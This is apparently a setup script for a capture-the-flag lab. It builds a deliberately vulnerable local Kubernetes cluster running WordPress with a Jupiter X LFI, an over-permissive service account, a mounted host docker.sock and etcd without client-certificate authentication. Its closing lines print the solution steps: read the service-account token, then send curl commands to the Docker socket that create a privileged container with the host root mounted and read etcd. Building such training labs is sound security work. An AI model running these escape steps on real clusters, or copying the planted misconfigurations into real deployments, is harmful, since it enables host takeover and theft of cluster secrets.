#!/bin/bash
# Chain 17: WordPress LFI → RCE → SA secrets → docker.sock escape → etcd (4 steps)
set -euo pipefail
K8S_ID="chain17"
ROOT="$(dirname "$(dirname "$(dirname "$0")")")"
CLUSTER_NAME="cve-chain17-wp-lfi"
source "$(dirname "$0")/../../scripts/k8s-common.sh"
FLAG1="${CVE_FLAG1:-flag{chain17-step1-lfi\}}"
FLAG2="${CVE_FLAG2:-flag{chain17-step2-rbac\}}"
FLAG3="${CVE_FLAG3:-flag{chain17-step3-escape\}}"
FLAG4="${CVE_FLAG4:-flag{chain17-step4-etcd-final\}}"

echo "[Chain 17] WordPress LFI to Cluster Admin"

# Step 1: build the WordPress (Jupiter X LFI) image and run it IN the cluster
echo "[*] Building WordPress image with CVE_FLAG=$FLAG1..."
docker build --build-arg CVE_FLAG="$FLAG1" \
  -t chain17-wp:local \
  -f "$ROOT/scenarios/web/wordpress-jupiterx-lfi/Dockerfile" \
  "$ROOT/scenarios/web/wordpress-jupiterx-lfi/" 2>&1 | tail -2

mkdir -p /home/kianabin/cve-flags/chain17

kind create cluster --name "$CLUSTER_NAME" --config - << 'KINDCFG'
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
nodes:
  - role: control-plane
    image: kindest/node:v1.27.3
    extraPortMappings:
      - containerPort: 30006
        hostPort: 10106
        protocol: TCP
    extraMounts:
      - hostPath: /var/run/docker.sock
        containerPath: /var/run/docker.sock
    kubeadmConfigPatches:
      - |
        kind: ClusterConfiguration
        etcd:
          local:
            extraArgs:
              client-cert-auth: "false"
KINDCFG

docker pull mysql:8.0.35 2>/dev/null || true
docker pull alpine:latest 2>/dev/null || true
kind load docker-image chain17-wp:local --name "$CLUSTER_NAME" 2>/dev/null || true
kind load docker-image mysql:8.0.35 --name "$CLUSTER_NAME" 2>/dev/null || true
kind load docker-image alpine:latest --name "$CLUSTER_NAME" 2>/dev/null || true
kubectl wait --for=condition=Ready pods --all -n kube-system --timeout=120s 2>/dev/null || true
sleep 10

# Step 2: over-permissive SA for the WordPress pod (kube-system secrets only)
kubectl create sa chain17-sa -n default 2>/dev/null || true
kubectl apply -f - << 'YAML'
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: chain17-secret-reader
  namespace: kube-system
rules:
  - apiGroups: [""]
    resources: ["secrets"]
    verbs: ["get", "list"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: chain17-secret-reader
  namespace: kube-system
subjects:
  - kind: ServiceAccount
    name: chain17-sa
    namespace: default
roleRef:
  kind: Role
  name: chain17-secret-reader
  apiGroup: rbac.authorization.k8s.io
YAML

kubectl create secret generic chain17-step2 --from-literal=flag="$FLAG2" -n kube-system 2>/dev/null || true

# Step 4 final flag: custom etcd key (invisible to the Kubernetes API)
k8s_put_etcd_key "/chain17-final" "$FLAG4"

# Deploy MySQL + WordPress (WordPress pod mounts the host docker.sock - misconfig)
kubectl apply -f - << 'YAML'
apiVersion: v1
kind: Service
metadata:
  name: mysql
  namespace: default
spec:
  selector:
    app: chain17-mysql
  ports:
    - port: 3306
      targetPort: 3306
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: chain17-mysql
  namespace: default
spec:
  replicas: 1
  selector:
    matchLabels:
      app: chain17-mysql
  template:
    metadata:
      labels:
        app: chain17-mysql
    spec:
      containers:
        - name: db
          image: mysql:8.0.35
          imagePullPolicy: IfNotPresent
          env:
            - name: MYSQL_ROOT_PASSWORD
              value: rootpassword
            - name: MYSQL_DATABASE
              value: wordpress
            - name: MYSQL_USER
              value: wordpress
            - name: MYSQL_PASSWORD
              value: wordpress
          ports:
            - containerPort: 3306
---
apiVersion: v1
kind: Service
metadata:
  name: chain17-wp
  namespace: default
spec:
  selector:
    app: chain17-wp
  ports:
    - port: 80
      targetPort: 80
      nodePort: 30006
  type: NodePort
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: chain17-wp
  namespace: default
spec:
  replicas: 1
  selector:
    matchLabels:
      app: chain17-wp
  template:
    metadata:
      labels:
        app: chain17-wp
    spec:
      serviceAccountName: chain17-sa
      containers:
        - name: wp
          image: chain17-wp:local
          imagePullPolicy: IfNotPresent
          env:
            - name: WORDPRESS_DB_HOST
              value: mysql
            - name: WORDPRESS_DB_USER
              value: wordpress
            - name: WORDPRESS_DB_PASSWORD
              value: wordpress
            - name: WORDPRESS_DB_NAME
              value: wordpress
          ports:
            - containerPort: 80
          volumeMounts:
            - name: docker-sock
              mountPath: /var/run/docker.sock
      volumes:
        - name: docker-sock
          hostPath:
            path: /var/run/docker.sock
            type: Socket
YAML

kubectl wait --for=condition=Ready pods -l app=chain17-mysql --timeout=180s 2>/dev/null || true
kubectl wait --for=condition=Ready pods -l app=chain17-wp --timeout=180s 2>/dev/null || true
sleep 10

echo ""
echo "[Chain 17] Ready"
echo "  Entry: http://localhost:10106 (WordPress with Jupiter X Core 4.8.7 LFI)"
echo "  Step 1: LFI -> read /flag.txt (flag{chain17-step1-lfi}) -> SVG upload RCE"
echo "  Step 2: from the RCE shell, read the pod SA token:"
echo "          cat /var/run/secrets/kubernetes.io/serviceaccount/token"
echo "          kubectl --token=\$T get secret chain17-step2 -n kube-system"
echo "  Step 3: docker socket escape from the WordPress pod:"
echo "          (no docker CLI in the pod - talk to the Docker API via curl --unix-socket)"
echo "          curl --unix-socket /var/run/docker.sock -X POST 'http://localhost/v1.41/containers/create?name=esc' -H 'Content-Type: application/json' -d '{\"Image\":\"curlimages/curl:latest\",\"HostConfig\":{\"Binds\":[\"/:/host\"],\"NetworkMode\":\"host\",\"Privileged\":true},\"Cmd\":[\"sh\",\"-c\",\"curl -sk -X POST https://127.0.0.1:2379/v3/kv/range -H \\\"Content-Type: application/json\\\" -d \\\"{\\\\\\\"key\\\\\\\":\\\\\\\"$(printf /chain17-final | base64 -w0)\\\\\\\"}\\\"; sleep 3600\"]}'"
echo "          curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/esc/start"
echo "          curl --unix-socket /var/run/docker.sock 'http://localhost/v1.41/containers/esc/logs?stdout=1'"
echo "  Step 4: the escaped container prints the custom etcd key and remains running; fetch its logs to collect the final flag."
